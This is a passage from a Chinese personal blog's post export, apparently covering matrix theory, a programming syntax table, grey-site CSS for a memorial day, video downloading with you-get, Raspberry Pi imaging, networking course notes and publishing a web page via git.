<p>$ [{\beta_j}]\leq lin [{\alpha_i}]<br>$且$ [{\gamma_k}]\leq lin [{\beta_j}]<br>$则$ [{\gamma_k}]\leq lin [{\alpha_i}]<br>$</p>
<p>A$\leq lin$B 意思是A可以由B线性表示。</p>
<ul>
<li>证：<br>即 Ax=B、By=C 有解，证明Az=C？<br>C=By=(Ax)y</li>
</ul>
<p><img src="https://www.codekp.cn/download/img/矩阵论/目录.png" width = "400" height = "302" alt="图片名称" align=center /></p>
]]></content>
      <categories>
        <category>研究生课程</category>
      </categories>
      <tags>
        <tag>研究生课程</tag>
        <tag>矩阵论</tag>
      </tags>
  </entry>
  <entry>
    <title>程序语法</title>
    <url>/2020/11/20/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="编程语言语法"><a href="#编程语言语法" class="headerlink" title="编程语言语法"></a><center>编程语言语法</center></h1><span id="more"></span>
<div class="table-container">
<table>
<thead>
<tr>
<th>程序  类型  语法</th>
<th>python</th>
<th>C++/C</th>
<th>java</th>
<th>matlab</th>
</tr>
</thead>
<tbody>
<tr>
<td>或</td>
<td>or</td>
<td>\</td>
<td>\</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>与</td>
<td>and</td>
<td>&amp;&amp;</td>
<td></td>
<td></td>
</tr>
<tr>
<td>非</td>
<td>not</td>
<td>!</td>
<td></td>
<td></td>
</tr>
<tr>
<td>条件语句</td>
<td>if 条件 :  制表符 elseif 或elif:  制表符 else :  制表符</td>
<td>if (条件){   } else if() {  } else {  }</td>
<td></td>
<td></td>
</tr>
<tr>
<td>循环语句</td>
<td>1.for for x in [1,2,3,…] :  制表符 2.while while 循环条件:  制表符</td>
<td>1.for for(int i=0;i\&lt;10;i++){} 2.while while(条件){}  do{ }while(条件)</td>
<td></td>
<td></td>
</tr>
<tr>
<td>语句之间</td>
<td>制表符</td>
<td>{}</td>
<td></td>
<td></td>
</tr>
<tr>
<td>dict表</td>
<td>d = {‘Michael’: 95, ‘Bob’: 75, ‘Tracy’: 85}</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>set</td>
<td>s1 = set([1, 2, 3]) s2 = set([2, 3, 4]) print(s1 &amp; s2) print(s1 \</td>
<td>s2) s1.add(4) s1.remove(1)</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>平方</td>
<td>import math math.sqrt(2)</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>函数定义</td>
<td>def wan_find(list, col, list2):  col_max = 0  col_y = 0  col=col  # a = np.linspace(0, 5, 5);   for i in [0, 1, 2, 3, 4, 5]:  if col_max \&lt; list[i, col] and (i not in list2):  col_y = i  col_max = list[i, col]   return col_y, col_max</td>
<td>int wan_find(float list[][], int col,int list2){         }</td>
<td></td>
<td></td>
</tr>
<tr>
<td>默认参数</td>
<td>def product(x, y=1, z=1, k=1):  return x * y * z * k</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>递归函数</td>
<td>def fact(n):  return fact_iter(n, 1)  def fact_iter(num, product):  if num == 1:  return product  return fact_iter(num - 1, num * product)</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>map</td>
<td>r =map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9]) list(r)</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>reduce</td>
<td>reduce(f, [x1, x2, x3, x4]) =  f(f(f(x1, x2), x3), x4)</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>filter</td>
<td>def is_odd(n):  return n % 2 == 1 r=filter(is_odd, [1, 2, 4, 5, 6, 9, 10, 15]) print(list(r))</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>快速排序</td>
<td>sorted([36, 5, -12, 9, -21], key=abs) key=abs按照绝对值排序</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>面向对象</td>
<td>class Student(object):   def _<em>init_</em>(self, name, score):  self.name = name  self.score = score   def print_score(self):  print(‘%s: %s’ % (self.name, self.score))   def get_grade(self):  if self.score >= 90:  return ‘A’  elif self.score >= 60:  return ‘B’  else:  return ‘C’</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <categories>
        <category>程序设计</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>程序设计</tag>
        <tag>matlab</tag>
        <tag>c</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>南京大屠杀国家公祭日_网站变成灰色以表悼念</title>
    <url>/2020/12/13/%E7%BD%91%E7%AB%99%E5%8F%98%E7%81%B0%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="南京大屠杀国家公祭日-网站变成灰色以表悼念"><a href="#南京大屠杀国家公祭日-网站变成灰色以表悼念" class="headerlink" title=" 南京大屠杀国家公祭日_网站变成灰色以表悼念 "></a><center> 南京大屠杀国家公祭日_网站变成灰色以表悼念 </center></h2><div style="position:relative; padding-bottom:75%; width:100%; height:0">
    <iframe src="//player.bilibili.com/player.html?aid=78993619&bvid=BV1cJ411C7Dg&cid=135180758&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position:absolute; height: 100%; width: 100%;"> </iframe>
</div>

<span id="more"></span>
<p>12月13日是第七个南京大屠杀死难者国家公祭日。公祭无辜死难之生命，告慰血与泪浸染之土地。这一天，举国上下以各种形式深切缅怀死难同胞，深切缅怀为中国人民抗日战争胜利献出生命的革命先烈和民族英雄，表达牢记历史、珍爱和平、矢志复兴，身为站长的我们都会让自己的网站的全部网页变成灰色（黑白色），以表示我们对逝者的悼念。</p>
<h3 id="第一种：修改CSS文件"><a href="#第一种：修改CSS文件" class="headerlink" title="第一种：修改CSS文件"></a>第一种：修改CSS文件</h3><p>我们可以在网页的CSS文件中添加以下的CSS代码，来实现网页黑白色，也就是网站变灰</p>
<pre class="line-numbers language-none"><code class="language-none">html &#123;
    filter: progid:DXImageTransform.Microsoft.BasicImage(grayscale&#x3D;1);
    -webkit-filter: grayscale(100%);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="第二种：在网页的标签内加入以下代码"><a href="#第二种：在网页的标签内加入以下代码" class="headerlink" title="第二种：在网页的标签内加入以下代码"></a>第二种：在网页的<head>标签内加入以下代码</h3><p>如果你不想改动CSS文件，你可以通过在网页头部中的<head>标签内部加入内联CSS代码的形式实现网站网页变灰</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;
html &#123;
filter: progid:DXImageTransform.Microsoft.BasicImage(grayscale&#x3D;1);
-webkit-filter: grayscale(100%);&#125;
&lt;&#x2F;style&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="第三种：修改标签加入内联样式"><a href="#第三种：修改标签加入内联样式" class="headerlink" title="第三种：修改标签加入内联样式"></a>第三种：修改<html>标签加入内联样式</h3><p>如里上面的两种方式都不喜欢，可以通过修改<html>标签，以加入内联样式的方法，达到网页变灰的效果</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;html style&#x3D;&quot;filter: progid:DXImageTransform.Microsoft.BasicImage(grayscale&#x3D;1);
-webkit-filter: grayscale(100%);&quot;&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>南京大屠杀国家公祭日</tag>
        <tag>hexo网站</tag>
      </tags>
  </entry>
  <entry>
    <title>网站视频下载及按帧将视频转为jpg</title>
    <url>/2020/10/15/%E7%BD%91%E7%AB%99%E8%A7%86%E9%A2%91%E4%B8%8B%E8%BD%BD%E5%8F%8A%E6%8C%89%E5%B8%A7%E8%BD%AC%E4%B8%BAjpg/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="网站视频下载及按帧转为jpg"><a href="#网站视频下载及按帧转为jpg" class="headerlink" title="网站视频下载及按帧转为jpg"></a>网站视频下载及按帧转为jpg</h1><h2 id="1、准备切割视频"><a href="#1、准备切割视频" class="headerlink" title="1、准备切割视频"></a>1、准备切割视频</h2><p>视频切割算法:<br><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">clc;
clear;
%读取视频
video_file&#x3D;&#39;D:\1.mp4&#39;;
obj&#x3D;VideoReader(video_file);
frame_num&#x3D;obj.NumberOfFrames;%一共有多少帧
% 分离图片
for i&#x3D;1:15%读取前15帧
    img&#x3D;strcat(&#39;D:\picture\&#39;,num2str(i));
    img&#x3D;strcat(img,&#39;.jpg&#39;);
    I&#x3D;read(obj,i);%读出第15帧图片
    imwrite(I,strcat(&#39;D:\picture\&#39;,num2str(i),&#39;.jpg&#39;),&#39;jpg&#39;);% 保存帧
end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="2、问题"><a href="#2、问题" class="headerlink" title="2、问题"></a>2、问题</h2><h4 id="考虑使用-you-get下载视频"><a href="#考虑使用-you-get下载视频" class="headerlink" title="考虑使用 you-get下载视频"></a>考虑使用 you-get下载视频</h4><ol>
<li>首先安装<br><kbd>pip install you-get</kbd></li>
<li>下载<br><kbd>you-get -i [URL]</kbd><br>-i:查看可以下载的详细信息<br><kbd>you-get —format=dash-flv  [URL]</kbd></li>
</ol>
<p>以此方法可以直接下载大部分网站上的视频。</p>
<h4 id="例子：以小鲤鱼历险记为例bilibili"><a href="#例子：以小鲤鱼历险记为例bilibili" class="headerlink" title="例子：以小鲤鱼历险记为例bilibili"></a>例子：以小鲤鱼历险记为例<a href="https://www.bilibili.com/video/BV1Ns411r7cX?from=search&amp;seid=2589828094683508837">bilibili</a></h4><ol>
<li>直接通过you-get进行下载<br>下载到的文件一般是flv需要解码，不能直接读取。<br><kbd>you-get <a href="https://www.bilibili.com/video/BV1Ns411r7cX?from=search&amp;seid=2589828094683508837">https://www.bilibili.com/video/BV1Ns411r7cX?from=search&amp;seid=2589828094683508837</a></kbd></li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/20201120164038867.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<ol>
<li><p>通过you-get -i 获取视频信息<br>找到需求的部分，本例使用小鲤鱼历险记mp4、720p为例。<br><kbd>you-get -i <a href="https://www.bilibili.com/video/BV1Ns411r7cX?from=search&amp;seid=2589828094683508837">https://www.bilibili.com/video/BV1Ns411r7cX?from=search&amp;seid=2589828094683508837</a></kbd><br><img src="https://img-blog.csdnimg.cn/20201120164038873.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
</li>
<li><p>通过you-get —format=dash-flv  获取视频信息<br>找到需求的部分，本例使用小鲤鱼历险记mp4、720p为例。 </p>
</li>
</ol>
<p><kbd>you-get —format=dash-720  <a href="https://www.bilibili.com/video/BV1Ns411r7cX?from=search&amp;seid=2589828094683508837">https://www.bilibili.com/video/BV1Ns411r7cX?from=search&amp;seid=2589828094683508837</a></kbd></p>
<p><img src="https://img-blog.csdnimg.cn/20201120164038865.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<ol>
<li>下载下来的文件地址为终端所在地址：<br>本文中为<kbd>E:\Users\root\【720p】小鲤鱼历险记【2006】【完结】【无水印高清】 (P1. 小鲤鱼历险记 01)[00].mp4</kbd></li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/20201120164038861.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h4 id="hevc未安装"><a href="#hevc未安装" class="headerlink" title="hevc未安装"></a>hevc未安装</h4><p>导致matlab无法读取下载的软件</p>
<h2 id="3、方法"><a href="#3、方法" class="headerlink" title="3、方法"></a>3、方法</h2><p>1、安装codec，网上有很多hevc但是目前免费办法中国区无法下载，于是参考很多文章后选择下载codec。</p>
<p>参考：</p>
<ul>
<li><ol>
<li><a href="http://www.codecguide.com/download_k-lite_codec_pack_basic.htm">http://www.codecguide.com/download_k-lite_codec_pack_basic.htm</a></li>
</ol>
</li>
<li><ol>
<li><a href="https://www.jianshu.com/p/dd7f04c27a79">https://www.jianshu.com/p/dd7f04c27a79</a></li>
</ol>
</li>
<li><ol>
<li><a href="https://mmrslwan1110.github.io">https://mmrslwan1110.github.io</a></li>
</ol>
</li>
</ul>
]]></content>
      <categories>
        <category>辅助技术</category>
      </categories>
      <tags>
        <tag>matlab</tag>
        <tag>视频</tag>
      </tags>
  </entry>
  <entry>
    <title>自制树莓派镜像的最简单方法</title>
    <url>/2021/07/14/%E8%87%AA%E5%88%B6%E6%A0%91%E8%8E%93%E6%B4%BE%E9%95%9C%E5%83%8F%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="自制树莓派镜像的最简单方法"><a href="#自制树莓派镜像的最简单方法" class="headerlink" title="自制树莓派镜像的最简单方法"></a>自制树莓派镜像的最简单方法</h1><h2 id="用sd卡制作img镜像"><a href="#用sd卡制作img镜像" class="headerlink" title="用sd卡制作img镜像"></a>用sd卡制作img镜像</h2><p>参考了很多博客和文档，有很多都是通过挂载的方式去烧录镜像，这种方法费时且低效。<br>并没有兴趣直接复制和挂载拷贝。<br>于是采用了第三个方法。</p>
<ul>
<li><p>将现有的系统制作成镜像img</p>
</li>
<li><p>将现有的系统制作成镜像img</p>
</li>
<li><p>将带有系统的sd卡用Win32DiskImager.exe工具Read成镜像文件xmu201.img</p>
</li>
</ul>
<p><img src="https://www.codekp.cn/download/img/树莓派/win.png" width = "681" height = "302" alt="图片名称" align=center /></p>
<blockquote>
<p>（选择盘符里面的“boot”盘，在本机的任何一个盘符里面写于.img文件名称，手写输入，然后点击Read，等待读取）</p>
</blockquote>
<ul>
<li>然后插入新卡到PC，将xmu201.img写入新卡</li>
<li>现在就制作出了完全一模一样的多种带系统的sd卡，现在的卡是不能直接使用的，因为还需要对设备进行网络设置，才能连接ssh。</li>
</ul>
<p>（这种方法所制作的镜像会和所录制的sd卡一样大，因此如果使用这种方法需要原系统sd卡尽量的小，本人采用16G的sd卡所以问题不大）</p>
<h2 id="通过balenaEtcher录入镜像"><a href="#通过balenaEtcher录入镜像" class="headerlink" title="通过balenaEtcher录入镜像"></a>通过balenaEtcher录入镜像</h2><ul>
<li><a href="https://blog.csdn.net/weixin_41216356/article/details/107071740">balenaEtcher过程可参考CSDN</a></li>
</ul>
]]></content>
      <categories>
        <category>树莓派</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>虚电路和数据报对比模型</title>
    <url>/2021/03/31/%E8%99%9A%E7%94%B5%E8%B7%AF%E5%92%8C%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%AF%B9%E6%AF%94%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>通过数学模型，我们可以比较虚电路和数据报的传输数率好坏。</p>
<h1 id="虚电路和数据报对比模型"><a href="#虚电路和数据报对比模型" class="headerlink" title="虚电路和数据报对比模型"></a>虚电路和数据报对比模型</h1><p>python如下所示：<br><pre class="line-numbers language-none"><code class="language-none">from scipy.special import comb
import math
import numpy as np
import matplotlib.pyplot as plt

def print_hi(name):
    print(f&#39;Sum,&#123;name&#125;&#39;)
if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    N&#x3D;100
    p&#x3D;0.1
    sum &#x3D; np.zeros(N)
    for n in range(N):
        for k in range(10):
            sum[n]&#x3D;comb(n,k)*math.pow(1-p, n-k )*math.pow(p, k ) +sum[n]
    print_hi(sum)
    plt.plot(sum)
    plt.show()
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="输出结果图："><a href="#输出结果图：" class="headerlink" title="输出结果图："></a>输出结果图：</h2><p><img src="https://img-blog.csdnimg.cn/20210331172103905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>研究生课程</category>
      </categories>
      <tags>
        <tag>网路比较</tag>
      </tags>
  </entry>
  <entry>
    <title>如何优雅的制作表白网站和罗盘时钟</title>
    <url>/2020/12/12/%E8%A1%A8%E7%99%BD%E7%BD%91%E7%AB%99%E3%80%81%E7%BD%97%E7%9B%98%E6%97%B6%E9%92%9F%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="如何优雅的制作表白网站和罗盘时钟"><a href="#如何优雅的制作表白网站和罗盘时钟" class="headerlink" title=" 如何优雅的制作表白网站和罗盘时钟"></a><center> 如何优雅的制作表白网站和罗盘时钟</center></h2><span id="more"></span>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>GitHub 是一个面向开源及私有软件项目的托管平台，因为只支持 Git 作为唯一的版本库格式进行托管，故名 GitHub。</p>
<p>GitHub 于 2008 年 4 月 10 日正式上线，除了 Git 代码仓库托管及基本的 Web 管理界面以外，还提供了订阅、讨论组、文本渲染、在线文件编辑器、协作图谱（报表）、代码片段分享（Gist）等功能。目前，其注册用户已经超过 350 万，托管版本数量也是非常之多，其中不乏知名开源项目 Ruby on Rails、jQuery、python 等。</p>
<p>本文需要先下载git <a href="https://git-scm.com/downloads">下载地址</a></p>
<p>git教程请参考<a href="https://www.liaoxuefeng.com/wiki/896043488029600">廖雪峰Git</a></p>
<h3 id="首先我们来学习一下，一些git的push方法"><a href="#首先我们来学习一下，一些git的push方法" class="headerlink" title="首先我们来学习一下，一些git的push方法"></a>首先我们来学习一下，一些git的push方法</h3><pre class="line-numbers language-none"><code class="language-none">git init
git add .
git commit -m &quot;first commit&quot;
git branch -M main
git remote add origin https:&#x2F;&#x2F;github.com&#x2F;mmrslwan1110&#x2F;Clock.git
git push -u origin master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>本过程可以参考我为大家寻找的教程<a href="https://www.cnblogs.com/lijiayi/p/githubpages.html">github创建账号、上传文件</a></p>
<h3 id="表白网站源码和罗盘时钟源码"><a href="#表白网站源码和罗盘时钟源码" class="headerlink" title="表白网站源码和罗盘时钟源码"></a>表白网站源码和罗盘时钟源码</h3><h4 id="表白网站源码"><a href="#表白网站源码" class="headerlink" title="表白网站源码"></a>表白网站源码</h4><p><a href="https://github.com/mmrslwan1110/love">表白网站源码_github</a><br><a href="https://codekp.cn/love">表白网站效果_codekp.cn</a></p>
<p>当然为大家也准备了一个更全的合集方便大家使用下载<a href="https://github.com/wanghaodi/LoveSourceCode">13个表白网站源码</a></p>
<blockquote>
<p>申明没有女朋友所以这个网站是初始状态仅供学习参考</p>
<h4 id="罗盘时钟源码"><a href="#罗盘时钟源码" class="headerlink" title="罗盘时钟源码"></a>罗盘时钟源码</h4><h5 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h5><p>建议采用命令行形式下载会更快，当然可以直接downloadzip文件。<br><pre class="line-numbers language-none"><code class="language-none">git clone  https:&#x2F;&#x2F;github.com&#x2F;mmrslwan1110&#x2F;Clock.git <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><img src="https://img-blog.csdnimg.cn/20201212231940305.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70#pic_center" alt="删除内部.git文件">删除download下来的.git文件</p>
<h5 id="上传源码到自己的web"><a href="#上传源码到自己的web" class="headerlink" title="上传源码到自己的web"></a>上传源码到自己的web</h5><ol>
<li>创建自己的仓库 参考1中教程</li>
<li>输入git init<pre class="line-numbers language-none"><code class="language-none">git init<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img src="https://img-blog.csdnimg.cn/20201212232314167.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">可以看到git创建了一个.git文件</li>
<li>git add .<pre class="line-numbers language-none"><code class="language-none">git add .<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img src="https://img-blog.csdnimg.cn/20201212232615556.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
</ol>
</blockquote>
<ol>
<li>git commit -m “first commit”<pre class="line-numbers language-none"><code class="language-none">git commit -m &quot;first commit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/20201212232746366.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<ol>
<li>git remote add origin <a href="https://github.com/mmrslwan1110/Clock.git">https://github.com/mmrslwan1110/Clock.git</a><pre class="line-numbers language-none"><code class="language-none">
git remote add origin https:&#x2F;&#x2F;github.com&#x2F;mmrslwan1110&#x2F;Clock.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<img src="https://img-blog.csdnimg.cn/20201212233029800.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
</ol>
<p>记得换成自己的链接哦</p>
<ol>
<li>git push -u origin master<pre class="line-numbers language-none"><code class="language-none">git push -u origin master<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img src="https://img-blog.csdnimg.cn/20201212233354499.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">已经发布到自己的网站了可以访问看看自己的网站测一下效果哦。</li>
</ol>
<p><a href="https://github.com/mmrslwan1110/Clock">罗盘时钟源码_github</a><br><a href="https://codekp.cn/Clock">罗盘时钟效果_codekp.cn</a></p>
<p><img src="https://www.mmrsl.cn/download/img/T-watch/Twatch.PNG" alt="在这里插入图片描述">已经发布到自己的网站了可以访问看看自己的网站测一下效果哦。</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>表白网站</tag>
        <tag>罗盘时钟</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机通信网</title>
    <url>/2021/03/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E4%BF%A1%E7%BD%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="计算机通信网"><a href="#计算机通信网" class="headerlink" title="计算机通信网"></a><center>计算机通信网</center></h1><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h3><p>a类地址：1~126</p>
<p>b类地址：128~191</p>
<p>c类地址：192~223</p>
<p>d类：224~239拥有组播通信</p>
<p>E类：240~255 保留给科学研究使用</p>
<p>私有地址包括3组 ：</p>
<p>A类：10.0.0.0~10.255.255.255</p>
<p>B类：172.16.0.0~172.31.255.255</p>
<p>C类：192.168.0.0~192.168.255.255</p>
<h3 id="路由器-route"><a href="#路由器-route" class="headerlink" title="路由器 route"></a>路由器 route</h3><p>把东西从一个地方送到另外一个地方的过程中，根据什么理由找到最佳的路的过程。</p>
<p>​跨越从源主机到目标主机的一个互联网络来转发数据包的过程。</p>
<p>路由器：router<br>能够将数据包转发到正确的目的地，并在转发的过程中选择最佳路径的设备就是路由器。</p>
<p>按顺序传输文件，按需送达文件。</p>
<p>在路由器上，有两个重要的东西，一个是路由算法，用来确定通过网络的端到端路径；另一个是转发表，转发表确定了本路由器如何转发分组。需要注意的是对于转发表，目的地址是32位的IP地址，所有转发表是按照地址的范围转发的。<br><img src="https://img-blog.csdn.net/20170928165940545" alt=""></p>
<h3 id="路由表"><a href="#路由表" class="headerlink" title="路由表"></a>路由表</h3><ul>
<li>路由表是在内存中存放在内核中的。</li>
<li>路由器根据路由表进行路径的选择</li>
<li>路由表中有目标网段和端口<h4 id="路由的类型："><a href="#路由的类型：" class="headerlink" title="路由的类型："></a>路由的类型：</h4></li>
</ul>
<ol>
<li>​直连路由 </li>
</ol>
<p>满足的条件（配置好ip地址，激活接口up状态）</p>
<ol>
<li>​静态路由</li>
</ol>
<p>需要人去手工的添加-》单向的<br>​</p>
<ol>
<li>默认路由</li>
</ol>
<p>当找不到匹配路由时走默认路由==》属于特殊的静态路由==》填写网关实质上就是配置一条默认路由</p>
<ol>
<li>动态路由</li>
</ol>
<p>路由器之间会互相告诉其他的路由器我能到哪里，相互进行学习–》动态路由协议：rip协议、ospf协议<br>shishenme</p>
<ol>
<li>路由的优先级：</li>
</ol>
<p>​直连路由–》静态路由–》动态路由–》默认路由</p>
<ul>
<li>路由转发数据包的封装过程：</li>
</ul>
<p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fpicture-pool.oss-cn-beijing.aliyuncs.com%2F006tNc79gy1g2xpmjpx6lj30zu0gmq9y.jpg&amp;refer=http%3A%2F%2Fpicture-pool.oss-cn-beijing.aliyuncs.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1619161640&amp;t=56a7ccf16296086feabc7da65a75f7b7" alt=""></p>
<h3 id="网络连接的建立"><a href="#网络连接的建立" class="headerlink" title="网络连接的建立"></a>网络连接的建立</h3><p>传输层</p>
<h3 id="虚电路和数据报"><a href="#虚电路和数据报" class="headerlink" title="虚电路和数据报"></a>虚电路和数据报</h3><h4 id="区别："><a href="#区别：" class="headerlink" title="区别："></a>区别：</h4><p>虚电路：严格预留资源，不会造成资源浪费，类似飞机。</p>
<p>数据报：不预留资源，统计复用，类似公交车。</p>
<p>网络层可以在两台主机之间提供无连接服务或连接服务。由网络层向运输层提供</p>
<p>虚电路网络：仅提供连接服务</p>
<p>数据报网络：仅提供无连接服务</p>
<blockquote>
<p>保障数据报里，端到端的通信。</p>
</blockquote>
<ol>
<li>建立连接</li>
</ol>
<p>在建立阶段，发送运输层与网络层联系，指定接收方地址，等待网络建立虚电路。网络层决定发送方和接收方之间的路径，即该虚电路的所有分组要通过的一系列链路和路由器。网络层也为沿着该路径的每条链路决定VC号。最后，网络层在沿着路径的每台路由器的转发表中增加一个表项。</p>
<ol>
<li>数据传送</li>
</ol>
<p><img src="https://img-blog.csdn.net/20180523215900208" alt=""></p>
<ol>
<li>虚电路删除。</li>
</ol>
<p>当发送方（或接收方）通知网络层它希望终止该虚电路时，就启动该阶段。网络层通常将通知网络另一侧的端系统结束呼叫，并更新路径上每台路由器中的转发表以表明该虚电路已不存在。</p>
